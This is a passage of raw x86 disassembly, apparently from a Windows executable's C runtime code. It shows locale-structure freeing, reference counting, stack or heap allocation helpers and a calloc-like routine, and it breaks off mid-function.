  409560:	e8 62 e5 ff ff       	call   0x407ac7
  409565:	59                   	pop    %ecx
  409566:	5e                   	pop    %esi
  409567:	5d                   	pop    %ebp
  409568:	c3                   	ret
  409569:	8b ff                	mov    %edi,%edi
  40956b:	55                   	push   %ebp
  40956c:	8b ec                	mov    %esp,%ebp
  40956e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409571:	53                   	push   %ebx
  409572:	56                   	push   %esi
  409573:	8b 75 08             	mov    0x8(%ebp),%esi
  409576:	57                   	push   %edi
  409577:	33 ff                	xor    %edi,%edi
  409579:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  40957c:	81 e1 ff ff ff 3f    	and    $0x3fffffff,%ecx
  409582:	3b c6                	cmp    %esi,%eax
  409584:	1b db                	sbb    %ebx,%ebx
  409586:	f7 d3                	not    %ebx
  409588:	23 d9                	and    %ecx,%ebx
  40958a:	74 10                	je     0x40959c
  40958c:	ff 36                	push   (%esi)
  40958e:	e8 34 e5 ff ff       	call   0x407ac7
  409593:	47                   	inc    %edi
  409594:	8d 76 04             	lea    0x4(%esi),%esi
  409597:	59                   	pop    %ecx
  409598:	3b fb                	cmp    %ebx,%edi
  40959a:	75 f0                	jne    0x40958c
  40959c:	5f                   	pop    %edi
  40959d:	5e                   	pop    %esi
  40959e:	5b                   	pop    %ebx
  40959f:	5d                   	pop    %ebp
  4095a0:	c3                   	ret
  4095a1:	8b ff                	mov    %edi,%edi
  4095a3:	55                   	push   %ebp
  4095a4:	8b ec                	mov    %esp,%ebp
  4095a6:	56                   	push   %esi
  4095a7:	8b 75 08             	mov    0x8(%ebp),%esi
  4095aa:	85 f6                	test   %esi,%esi
  4095ac:	0f 84 d0 00 00 00    	je     0x409682
  4095b2:	6a 07                	push   $0x7
  4095b4:	56                   	push   %esi
  4095b5:	e8 af ff ff ff       	call   0x409569
  4095ba:	8d 46 1c             	lea    0x1c(%esi),%eax
  4095bd:	6a 07                	push   $0x7
  4095bf:	50                   	push   %eax
  4095c0:	e8 a4 ff ff ff       	call   0x409569
  4095c5:	8d 46 38             	lea    0x38(%esi),%eax
  4095c8:	6a 0c                	push   $0xc
  4095ca:	50                   	push   %eax
  4095cb:	e8 99 ff ff ff       	call   0x409569
  4095d0:	8d 46 68             	lea    0x68(%esi),%eax
  4095d3:	6a 0c                	push   $0xc
  4095d5:	50                   	push   %eax
  4095d6:	e8 8e ff ff ff       	call   0x409569
  4095db:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
  4095e1:	6a 02                	push   $0x2
  4095e3:	50                   	push   %eax
  4095e4:	e8 80 ff ff ff       	call   0x409569
  4095e9:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  4095ef:	e8 d3 e4 ff ff       	call   0x407ac7
  4095f4:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  4095fa:	e8 c8 e4 ff ff       	call   0x407ac7
  4095ff:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  409605:	e8 bd e4 ff ff       	call   0x407ac7
  40960a:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
  409610:	6a 07                	push   $0x7
  409612:	50                   	push   %eax
  409613:	e8 51 ff ff ff       	call   0x409569
  409618:	8d 86 d0 00 00 00    	lea    0xd0(%esi),%eax
  40961e:	6a 07                	push   $0x7
  409620:	50                   	push   %eax
  409621:	e8 43 ff ff ff       	call   0x409569
  409626:	83 c4 44             	add    $0x44,%esp
  409629:	8d 86 ec 00 00 00    	lea    0xec(%esi),%eax
  40962f:	6a 0c                	push   $0xc
  409631:	50                   	push   %eax
  409632:	e8 32 ff ff ff       	call   0x409569
  409637:	8d 86 1c 01 00 00    	lea    0x11c(%esi),%eax
  40963d:	6a 0c                	push   $0xc
  40963f:	50                   	push   %eax
  409640:	e8 24 ff ff ff       	call   0x409569
  409645:	8d 86 4c 01 00 00    	lea    0x14c(%esi),%eax
  40964b:	6a 02                	push   $0x2
  40964d:	50                   	push   %eax
  40964e:	e8 16 ff ff ff       	call   0x409569
  409653:	ff b6 54 01 00 00    	push   0x154(%esi)
  409659:	e8 69 e4 ff ff       	call   0x407ac7
  40965e:	ff b6 58 01 00 00    	push   0x158(%esi)
  409664:	e8 5e e4 ff ff       	call   0x407ac7
  409669:	ff b6 5c 01 00 00    	push   0x15c(%esi)
  40966f:	e8 53 e4 ff ff       	call   0x407ac7
  409674:	ff b6 60 01 00 00    	push   0x160(%esi)
  40967a:	e8 48 e4 ff ff       	call   0x407ac7
  40967f:	83 c4 28             	add    $0x28,%esp
  409682:	5e                   	pop    %esi
  409683:	5d                   	pop    %ebp
  409684:	c3                   	ret
  409685:	8b ff                	mov    %edi,%edi
  409687:	55                   	push   %ebp
  409688:	8b ec                	mov    %esp,%ebp
  40968a:	83 ec 1c             	sub    $0x1c,%esp
  40968d:	a1 04 60 41 00       	mov    0x416004,%eax
  409692:	33 c5                	xor    %ebp,%eax
  409694:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409697:	53                   	push   %ebx
  409698:	56                   	push   %esi
  409699:	57                   	push   %edi
  40969a:	ff 75 08             	push   0x8(%ebp)
  40969d:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4096a0:	e8 bb c1 ff ff       	call   0x405860
  4096a5:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  4096a8:	85 db                	test   %ebx,%ebx
  4096aa:	75 06                	jne    0x4096b2
  4096ac:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4096af:	8b 58 08             	mov    0x8(%eax),%ebx
  4096b2:	33 c0                	xor    %eax,%eax
  4096b4:	33 ff                	xor    %edi,%edi
  4096b6:	39 45 20             	cmp    %eax,0x20(%ebp)
  4096b9:	57                   	push   %edi
  4096ba:	57                   	push   %edi
  4096bb:	ff 75 14             	push   0x14(%ebp)
  4096be:	0f 95 c0             	setne  %al
  4096c1:	ff 75 10             	push   0x10(%ebp)
  4096c4:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  4096cb:	50                   	push   %eax
  4096cc:	53                   	push   %ebx
  4096cd:	e8 73 f6 ff ff       	call   0x408d45
  4096d2:	83 c4 18             	add    $0x18,%esp
  4096d5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4096d8:	85 c0                	test   %eax,%eax
  4096da:	0f 84 84 00 00 00    	je     0x409764
  4096e0:	8d 14 00             	lea    (%eax,%eax,1),%edx
  4096e3:	8d 4a 08             	lea    0x8(%edx),%ecx
  4096e6:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4096e9:	3b d1                	cmp    %ecx,%edx
  4096eb:	1b c0                	sbb    %eax,%eax
  4096ed:	23 c1                	and    %ecx,%eax
  4096ef:	74 35                	je     0x409726
  4096f1:	3d 00 04 00 00       	cmp    $0x400,%eax
  4096f6:	77 13                	ja     0x40970b
  4096f8:	e8 73 4d 00 00       	call   0x40e470
  4096fd:	8b f4                	mov    %esp,%esi
  4096ff:	85 f6                	test   %esi,%esi
  409701:	74 1e                	je     0x409721
  409703:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
  409709:	eb 13                	jmp    0x40971e
  40970b:	50                   	push   %eax
  40970c:	e8 0b e3 ff ff       	call   0x407a1c
  409711:	8b f0                	mov    %eax,%esi
  409713:	59                   	pop    %ecx
  409714:	85 f6                	test   %esi,%esi
  409716:	74 09                	je     0x409721
  409718:	c7 06 dd dd 00 00    	movl   $0xdddd,(%esi)
  40971e:	83 c6 08             	add    $0x8,%esi
  409721:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409724:	eb 02                	jmp    0x409728
  409726:	8b f7                	mov    %edi,%esi
  409728:	85 f6                	test   %esi,%esi
  40972a:	74 31                	je     0x40975d
  40972c:	52                   	push   %edx
  40972d:	57                   	push   %edi
  40972e:	56                   	push   %esi
  40972f:	e8 5c b3 ff ff       	call   0x404a90
  409734:	ff 75 f4             	push   -0xc(%ebp)
  409737:	56                   	push   %esi
  409738:	ff 75 14             	push   0x14(%ebp)
  40973b:	ff 75 10             	push   0x10(%ebp)
  40973e:	6a 01                	push   $0x1
  409740:	53                   	push   %ebx
  409741:	e8 ff f5 ff ff       	call   0x408d45
  409746:	83 c4 24             	add    $0x24,%esp
  409749:	85 c0                	test   %eax,%eax
  40974b:	74 10                	je     0x40975d
  40974d:	ff 75 18             	push   0x18(%ebp)
  409750:	50                   	push   %eax
  409751:	56                   	push   %esi
  409752:	ff 75 0c             	push   0xc(%ebp)
  409755:	ff 15 4c f1 40 00    	call   *0x40f14c
  40975b:	8b f8                	mov    %eax,%edi
  40975d:	56                   	push   %esi
  40975e:	e8 25 00 00 00       	call   0x409788
  409763:	59                   	pop    %ecx
  409764:	80 7d f0 00          	cmpb   $0x0,-0x10(%ebp)
  409768:	74 0a                	je     0x409774
  40976a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40976d:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
  409774:	8b c7                	mov    %edi,%eax
  409776:	8d 65 d8             	lea    -0x28(%ebp),%esp
  409779:	5f                   	pop    %edi
  40977a:	5e                   	pop    %esi
  40977b:	5b                   	pop    %ebx
  40977c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40977f:	33 cd                	xor    %ebp,%ecx
  409781:	e8 bf 9f ff ff       	call   0x403745
  409786:	c9                   	leave
  409787:	c3                   	ret
  409788:	8b ff                	mov    %edi,%edi
  40978a:	55                   	push   %ebp
  40978b:	8b ec                	mov    %esp,%ebp
  40978d:	8b 45 08             	mov    0x8(%ebp),%eax
  409790:	85 c0                	test   %eax,%eax
  409792:	74 12                	je     0x4097a6
  409794:	83 e8 08             	sub    $0x8,%eax
  409797:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  40979d:	75 07                	jne    0x4097a6
  40979f:	50                   	push   %eax
  4097a0:	e8 22 e3 ff ff       	call   0x407ac7
  4097a5:	59                   	pop    %ecx
  4097a6:	5d                   	pop    %ebp
  4097a7:	c3                   	ret
  4097a8:	8b ff                	mov    %edi,%edi
  4097aa:	55                   	push   %ebp
  4097ab:	8b ec                	mov    %esp,%ebp
  4097ad:	8b 45 08             	mov    0x8(%ebp),%eax
  4097b0:	f0 ff 40 0c          	lock incl 0xc(%eax)
  4097b4:	8b 48 7c             	mov    0x7c(%eax),%ecx
  4097b7:	85 c9                	test   %ecx,%ecx
  4097b9:	74 03                	je     0x4097be
  4097bb:	f0 ff 01             	lock incl (%ecx)
  4097be:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  4097c4:	85 c9                	test   %ecx,%ecx
  4097c6:	74 03                	je     0x4097cb
  4097c8:	f0 ff 01             	lock incl (%ecx)
  4097cb:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  4097d1:	85 c9                	test   %ecx,%ecx
  4097d3:	74 03                	je     0x4097d8
  4097d5:	f0 ff 01             	lock incl (%ecx)
  4097d8:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  4097de:	85 c9                	test   %ecx,%ecx
  4097e0:	74 03                	je     0x4097e5
  4097e2:	f0 ff 01             	lock incl (%ecx)
  4097e5:	56                   	push   %esi
  4097e6:	6a 06                	push   $0x6
  4097e8:	8d 48 28             	lea    0x28(%eax),%ecx
  4097eb:	5e                   	pop    %esi
  4097ec:	81 79 f8 20 61 41 00 	cmpl   $0x416120,-0x8(%ecx)
  4097f3:	74 09                	je     0x4097fe
  4097f5:	8b 11                	mov    (%ecx),%edx
  4097f7:	85 d2                	test   %edx,%edx
  4097f9:	74 03                	je     0x4097fe
  4097fb:	f0 ff 02             	lock incl (%edx)
  4097fe:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  409802:	74 0a                	je     0x40980e
  409804:	8b 51 fc             	mov    -0x4(%ecx),%edx
  409807:	85 d2                	test   %edx,%edx
  409809:	74 03                	je     0x40980e
  40980b:	f0 ff 02             	lock incl (%edx)
  40980e:	83 c1 10             	add    $0x10,%ecx
  409811:	83 ee 01             	sub    $0x1,%esi
  409814:	75 d6                	jne    0x4097ec
  409816:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  40981c:	e8 4c 01 00 00       	call   0x40996d
  409821:	59                   	pop    %ecx
  409822:	5e                   	pop    %esi
  409823:	5d                   	pop    %ebp
  409824:	c3                   	ret
  409825:	8b ff                	mov    %edi,%edi
  409827:	55                   	push   %ebp
  409828:	8b ec                	mov    %esp,%ebp
  40982a:	51                   	push   %ecx
  40982b:	53                   	push   %ebx
  40982c:	56                   	push   %esi
  40982d:	8b 75 08             	mov    0x8(%ebp),%esi
  409830:	57                   	push   %edi
  409831:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
  409837:	85 c0                	test   %eax,%eax
  409839:	74 6c                	je     0x4098a7
  40983b:	3d 48 66 41 00       	cmp    $0x416648,%eax
  409840:	74 65                	je     0x4098a7
  409842:	8b 46 7c             	mov    0x7c(%esi),%eax
  409845:	85 c0                	test   %eax,%eax
  409847:	74 5e                	je     0x4098a7
  409849:	83 38 00             	cmpl   $0x0,(%eax)
  40984c:	75 59                	jne    0x4098a7
  40984e:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  409854:	85 c0                	test   %eax,%eax
  409856:	74 18                	je     0x409870
  409858:	83 38 00             	cmpl   $0x0,(%eax)
  40985b:	75 13                	jne    0x409870
  40985d:	50                   	push   %eax
  40985e:	e8 64 e2 ff ff       	call   0x407ac7
  409863:	ff b6 88 00 00 00    	push   0x88(%esi)
  409869:	e8 94 fb ff ff       	call   0x409402
  40986e:	59                   	pop    %ecx
  40986f:	59                   	pop    %ecx
  409870:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  409876:	85 c0                	test   %eax,%eax
  409878:	74 18                	je     0x409892
  40987a:	83 38 00             	cmpl   $0x0,(%eax)
  40987d:	75 13                	jne    0x409892
  40987f:	50                   	push   %eax
  409880:	e8 42 e2 ff ff       	call   0x407ac7
  409885:	ff b6 88 00 00 00    	push   0x88(%esi)
  40988b:	e8 70 fc ff ff       	call   0x409500
  409890:	59                   	pop    %ecx
  409891:	59                   	pop    %ecx
  409892:	ff 76 7c             	push   0x7c(%esi)
  409895:	e8 2d e2 ff ff       	call   0x407ac7
  40989a:	ff b6 88 00 00 00    	push   0x88(%esi)
  4098a0:	e8 22 e2 ff ff       	call   0x407ac7
  4098a5:	59                   	pop    %ecx
  4098a6:	59                   	pop    %ecx
  4098a7:	8b 86 8c 00 00 00    	mov    0x8c(%esi),%eax
  4098ad:	85 c0                	test   %eax,%eax
  4098af:	74 45                	je     0x4098f6
  4098b1:	83 38 00             	cmpl   $0x0,(%eax)
  4098b4:	75 40                	jne    0x4098f6
  4098b6:	8b 86 90 00 00 00    	mov    0x90(%esi),%eax
  4098bc:	2d fe 00 00 00       	sub    $0xfe,%eax
  4098c1:	50                   	push   %eax
  4098c2:	e8 00 e2 ff ff       	call   0x407ac7
  4098c7:	8b 86 94 00 00 00    	mov    0x94(%esi),%eax
  4098cd:	bf 80 00 00 00       	mov    $0x80,%edi
  4098d2:	2b c7                	sub    %edi,%eax
  4098d4:	50                   	push   %eax
  4098d5:	e8 ed e1 ff ff       	call   0x407ac7
  4098da:	8b 86 98 00 00 00    	mov    0x98(%esi),%eax
  4098e0:	2b c7                	sub    %edi,%eax
  4098e2:	50                   	push   %eax
  4098e3:	e8 df e1 ff ff       	call   0x407ac7
  4098e8:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  4098ee:	e8 d4 e1 ff ff       	call   0x407ac7
  4098f3:	83 c4 10             	add    $0x10,%esp
  4098f6:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  4098fc:	e8 95 00 00 00       	call   0x409996
  409901:	59                   	pop    %ecx
  409902:	6a 06                	push   $0x6
  409904:	58                   	pop    %eax
  409905:	8d 9e a0 00 00 00    	lea    0xa0(%esi),%ebx
  40990b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40990e:	8d 7e 28             	lea    0x28(%esi),%edi
  409911:	81 7f f8 20 61 41 00 	cmpl   $0x416120,-0x8(%edi)
  409918:	74 1d                	je     0x409937
  40991a:	8b 07                	mov    (%edi),%eax
  40991c:	85 c0                	test   %eax,%eax
  40991e:	74 14                	je     0x409934
  409920:	83 38 00             	cmpl   $0x0,(%eax)
  409923:	75 0f                	jne    0x409934
  409925:	50                   	push   %eax
  409926:	e8 9c e1 ff ff       	call   0x407ac7
  40992b:	ff 33                	push   (%ebx)
  40992d:	e8 95 e1 ff ff       	call   0x407ac7
  409932:	59                   	pop    %ecx
  409933:	59                   	pop    %ecx
  409934:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409937:	83 7f f4 00          	cmpl   $0x0,-0xc(%edi)
  40993b:	74 16                	je     0x409953
  40993d:	8b 47 fc             	mov    -0x4(%edi),%eax
  409940:	85 c0                	test   %eax,%eax
  409942:	74 0c                	je     0x409950
  409944:	83 38 00             	cmpl   $0x0,(%eax)
  409947:	75 07                	jne    0x409950
  409949:	50                   	push   %eax
  40994a:	e8 78 e1 ff ff       	call   0x407ac7
  40994f:	59                   	pop    %ecx
  409950:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409953:	83 c3 04             	add    $0x4,%ebx
  409956:	83 c7 10             	add    $0x10,%edi
  409959:	83 e8 01             	sub    $0x1,%eax
  40995c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40995f:	75 b0                	jne    0x409911
  409961:	56                   	push   %esi
  409962:	e8 60 e1 ff ff       	call   0x407ac7
  409967:	59                   	pop    %ecx
  409968:	5f                   	pop    %edi
  409969:	5e                   	pop    %esi
  40996a:	5b                   	pop    %ebx
  40996b:	c9                   	leave
  40996c:	c3                   	ret
  40996d:	8b ff                	mov    %edi,%edi
  40996f:	55                   	push   %ebp
  409970:	8b ec                	mov    %esp,%ebp
  409972:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409975:	85 c9                	test   %ecx,%ecx
  409977:	74 16                	je     0x40998f
  409979:	81 f9 90 05 41 00    	cmp    $0x410590,%ecx
  40997f:	74 0e                	je     0x40998f
  409981:	33 c0                	xor    %eax,%eax
  409983:	40                   	inc    %eax
  409984:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  40998b:	00 
  40998c:	40                   	inc    %eax
  40998d:	5d                   	pop    %ebp
  40998e:	c3                   	ret
  40998f:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  409994:	5d                   	pop    %ebp
  409995:	c3                   	ret
  409996:	8b ff                	mov    %edi,%edi
  409998:	55                   	push   %ebp
  409999:	8b ec                	mov    %esp,%ebp
  40999b:	56                   	push   %esi
  40999c:	8b 75 08             	mov    0x8(%ebp),%esi
  40999f:	85 f6                	test   %esi,%esi
  4099a1:	74 21                	je     0x4099c4
  4099a3:	81 fe 90 05 41 00    	cmp    $0x410590,%esi
  4099a9:	74 19                	je     0x4099c4
  4099ab:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  4099b1:	90                   	nop
  4099b2:	85 c0                	test   %eax,%eax
  4099b4:	75 0e                	jne    0x4099c4
  4099b6:	56                   	push   %esi
  4099b7:	e8 e5 fb ff ff       	call   0x4095a1
  4099bc:	56                   	push   %esi
  4099bd:	e8 05 e1 ff ff       	call   0x407ac7
  4099c2:	59                   	pop    %ecx
  4099c3:	59                   	pop    %ecx
  4099c4:	5e                   	pop    %esi
  4099c5:	5d                   	pop    %ebp
  4099c6:	c3                   	ret
  4099c7:	8b ff                	mov    %edi,%edi
  4099c9:	55                   	push   %ebp
  4099ca:	8b ec                	mov    %esp,%ebp
  4099cc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4099cf:	85 c9                	test   %ecx,%ecx
  4099d1:	74 16                	je     0x4099e9
  4099d3:	81 f9 90 05 41 00    	cmp    $0x410590,%ecx
  4099d9:	74 0e                	je     0x4099e9
  4099db:	83 c8 ff             	or     $0xffffffff,%eax
  4099de:	f0 0f c1 81 b0 00 00 	lock xadd %eax,0xb0(%ecx)
  4099e5:	00 
  4099e6:	48                   	dec    %eax
  4099e7:	5d                   	pop    %ebp
  4099e8:	c3                   	ret
  4099e9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4099ee:	5d                   	pop    %ebp
  4099ef:	c3                   	ret
  4099f0:	8b ff                	mov    %edi,%edi
  4099f2:	55                   	push   %ebp
  4099f3:	8b ec                	mov    %esp,%ebp
  4099f5:	8b 45 08             	mov    0x8(%ebp),%eax
  4099f8:	85 c0                	test   %eax,%eax
  4099fa:	74 73                	je     0x409a6f
  4099fc:	f0 ff 48 0c          	lock decl 0xc(%eax)
  409a00:	8b 48 7c             	mov    0x7c(%eax),%ecx
  409a03:	85 c9                	test   %ecx,%ecx
  409a05:	74 03                	je     0x409a0a
  409a07:	f0 ff 09             	lock decl (%ecx)
  409a0a:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  409a10:	85 c9                	test   %ecx,%ecx
  409a12:	74 03                	je     0x409a17
  409a14:	f0 ff 09             	lock decl (%ecx)
  409a17:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  409a1d:	85 c9                	test   %ecx,%ecx
  409a1f:	74 03                	je     0x409a24
  409a21:	f0 ff 09             	lock decl (%ecx)
  409a24:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  409a2a:	85 c9                	test   %ecx,%ecx
  409a2c:	74 03                	je     0x409a31
  409a2e:	f0 ff 09             	lock decl (%ecx)
  409a31:	56                   	push   %esi
  409a32:	6a 06                	push   $0x6
  409a34:	8d 48 28             	lea    0x28(%eax),%ecx
  409a37:	5e                   	pop    %esi
  409a38:	81 79 f8 20 61 41 00 	cmpl   $0x416120,-0x8(%ecx)
  409a3f:	74 09                	je     0x409a4a
  409a41:	8b 11                	mov    (%ecx),%edx
  409a43:	85 d2                	test   %edx,%edx
  409a45:	74 03                	je     0x409a4a
  409a47:	f0 ff 0a             	lock decl (%edx)
  409a4a:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  409a4e:	74 0a                	je     0x409a5a
  409a50:	8b 51 fc             	mov    -0x4(%ecx),%edx
  409a53:	85 d2                	test   %edx,%edx
  409a55:	74 03                	je     0x409a5a
  409a57:	f0 ff 0a             	lock decl (%edx)
  409a5a:	83 c1 10             	add    $0x10,%ecx
  409a5d:	83 ee 01             	sub    $0x1,%esi
  409a60:	75 d6                	jne    0x409a38
  409a62:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  409a68:	e8 5a ff ff ff       	call   0x4099c7
  409a6d:	59                   	pop    %ecx
  409a6e:	5e                   	pop    %esi
  409a6f:	5d                   	pop    %ebp
  409a70:	c3                   	ret
  409a71:	6a 0c                	push   $0xc
  409a73:	68 98 4a 41 00       	push   $0x414a98
  409a78:	e8 73 a7 ff ff       	call   0x4041f0
  409a7d:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  409a81:	e8 7a d5 ff ff       	call   0x407000
  409a86:	8d 78 4c             	lea    0x4c(%eax),%edi
  409a89:	8b 0d a0 66 41 00    	mov    0x4166a0,%ecx
  409a8f:	85 88 50 03 00 00    	test   %ecx,0x350(%eax)
  409a95:	74 06                	je     0x409a9d
  409a97:	8b 37                	mov    (%edi),%esi
  409a99:	85 f6                	test   %esi,%esi
  409a9b:	75 3d                	jne    0x409ada
  409a9d:	6a 04                	push   $0x4
  409a9f:	e8 19 df ff ff       	call   0x4079bd
  409aa4:	59                   	pop    %ecx
  409aa5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409aa9:	ff 35 38 6f 41 00    	push   0x416f38
  409aaf:	57                   	push   %edi
  409ab0:	e8 3d 00 00 00       	call   0x409af2
  409ab5:	59                   	pop    %ecx
  409ab6:	59                   	pop    %ecx
  409ab7:	8b f0                	mov    %eax,%esi
  409ab9:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409abc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409ac3:	e8 09 00 00 00       	call   0x409ad1
  409ac8:	85 f6                	test   %esi,%esi
  409aca:	74 20                	je     0x409aec
  409acc:	eb 0c                	jmp    0x409ada
  409ace:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  409ad1:	6a 04                	push   $0x4
  409ad3:	e8 2d df ff ff       	call   0x407a05
  409ad8:	59                   	pop    %ecx
  409ad9:	c3                   	ret
  409ada:	8b c6                	mov    %esi,%eax
  409adc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409adf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409ae6:	59                   	pop    %ecx
  409ae7:	5f                   	pop    %edi
  409ae8:	5e                   	pop    %esi
  409ae9:	5b                   	pop    %ebx
  409aea:	c9                   	leave
  409aeb:	c3                   	ret
  409aec:	e8 cc d0 ff ff       	call   0x406bbd
  409af1:	cc                   	int3
  409af2:	8b ff                	mov    %edi,%edi
  409af4:	55                   	push   %ebp
  409af5:	8b ec                	mov    %esp,%ebp
  409af7:	56                   	push   %esi
  409af8:	8b 75 0c             	mov    0xc(%ebp),%esi
  409afb:	57                   	push   %edi
  409afc:	85 f6                	test   %esi,%esi
  409afe:	74 3c                	je     0x409b3c
  409b00:	8b 45 08             	mov    0x8(%ebp),%eax
  409b03:	85 c0                	test   %eax,%eax
  409b05:	74 35                	je     0x409b3c
  409b07:	8b 38                	mov    (%eax),%edi
  409b09:	3b fe                	cmp    %esi,%edi
  409b0b:	75 04                	jne    0x409b11
  409b0d:	8b c6                	mov    %esi,%eax
  409b0f:	eb 2d                	jmp    0x409b3e
  409b11:	56                   	push   %esi
  409b12:	89 30                	mov    %esi,(%eax)
  409b14:	e8 8f fc ff ff       	call   0x4097a8
  409b19:	59                   	pop    %ecx
  409b1a:	85 ff                	test   %edi,%edi
  409b1c:	74 ef                	je     0x409b0d
  409b1e:	57                   	push   %edi
  409b1f:	e8 cc fe ff ff       	call   0x4099f0
  409b24:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
  409b28:	59                   	pop    %ecx
  409b29:	75 e2                	jne    0x409b0d
  409b2b:	81 ff 60 60 41 00    	cmp    $0x416060,%edi
  409b31:	74 da                	je     0x409b0d
  409b33:	57                   	push   %edi
  409b34:	e8 ec fc ff ff       	call   0x409825
  409b39:	59                   	pop    %ecx
  409b3a:	eb d1                	jmp    0x409b0d
  409b3c:	33 c0                	xor    %eax,%eax
  409b3e:	5f                   	pop    %edi
  409b3f:	5e                   	pop    %esi
  409b40:	5d                   	pop    %ebp
  409b41:	c3                   	ret
  409b42:	8b ff                	mov    %edi,%edi
  409b44:	55                   	push   %ebp
  409b45:	8b ec                	mov    %esp,%ebp
  409b47:	56                   	push   %esi
  409b48:	8b 75 0c             	mov    0xc(%ebp),%esi
  409b4b:	85 f6                	test   %esi,%esi
  409b4d:	74 1b                	je     0x409b6a
  409b4f:	6a e0                	push   $0xffffffe0
  409b51:	33 d2                	xor    %edx,%edx
  409b53:	58                   	pop    %eax
  409b54:	f7 f6                	div    %esi
  409b56:	3b 45 10             	cmp    0x10(%ebp),%eax
  409b59:	73 0f                	jae    0x409b6a
  409b5b:	e8 5b d9 ff ff       	call   0x4074bb
  409b60:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  409b66:	33 c0                	xor    %eax,%eax
  409b68:	eb 42                	jmp    0x409bac
  409b6a:	53                   	push   %ebx
  409b6b:	8b 5d 08             	mov    0x8(%ebp),%ebx
  409b6e:	57                   	push   %edi
  409b6f:	85 db                	test   %ebx,%ebx
  409b71:	74 0b                	je     0x409b7e
  409b73:	53                   	push   %ebx
  409b74:	e8 dd 16 00 00       	call   0x40b256
  409b79:	59                   	pop    %ecx
  409b7a:	8b f8                	mov    %eax,%edi
  409b7c:	eb 02                	jmp    0x409b80
  409b7e:	33 ff                	xor    %edi,%edi
  409b80:	0f af 75 10          	imul   0x10(%ebp),%esi
  409b84:	56                   	push   %esi
  409b85:	53                   	push   %ebx
  409b86:	e8 fe 16 00 00       	call   0x40b289
  409b8b:	8b d8                	mov    %eax,%ebx
  409b8d:	59                   	pop    %ecx
  409b8e:	59                   	pop    %ecx
  409b8f:	85 db                	test   %ebx,%ebx
  409b91:	74 15                	je     0x409ba8
  409b93:	3b fe                	cmp    %esi,%edi
  409b95:	73 11                	jae    0x409ba8
  409b97:	2b f7                	sub    %edi,%esi
  409b99:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  409b9c:	56                   	push   %esi
  409b9d:	6a 00                	push   $0x0
  409b9f:	50                   	push   %eax
  409ba0:	e8 eb ae ff ff       	call   0x404a90
  409ba5:	83 c4 0c             	add    $0xc,%esp
  409ba8:	5f                   	pop    %edi
  409ba9:	8b c3                	mov    %ebx,%eax
  409bab:	5b                   	pop    %ebx
  409bac:	5e                   	pop    %esi
  409bad:	5d                   	pop    %ebp
  409bae:	c3                   	ret
  409baf:	ff 15 48 f1 40 00    	call   *0x40f148
  409bb5:	85 c0                	test   %eax,%eax
  409bb7:	a3 d4 72 41 00       	mov    %eax,0x4172d4
  409bbc:	0f 95 c0             	setne  %al
  409bbf:	c3                   	ret
  409bc0:	83 25 d4 72 41 00 00 	andl   $0x0,0x4172d4
  409bc7:	b0 01                	mov    $0x1,%al
  409bc9:	c3                   	ret
  409bca:	8b ff                	mov    %edi,%edi
  409bcc:	55                   	push   %ebp
  409bcd:	8b ec                	mov    %esp,%ebp
  409bcf:	53                   	push   %ebx
  409bd0:	56                   	push   %esi
  409bd1:	57                   	push   %edi
  409bd2:	8b 7d 08             	mov    0x8(%ebp),%edi
  409bd5:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  409bd8:	74 51                	je     0x409c2b
  409bda:	8b f7                	mov    %edi,%esi
  409bdc:	8b 1e                	mov    (%esi),%ebx
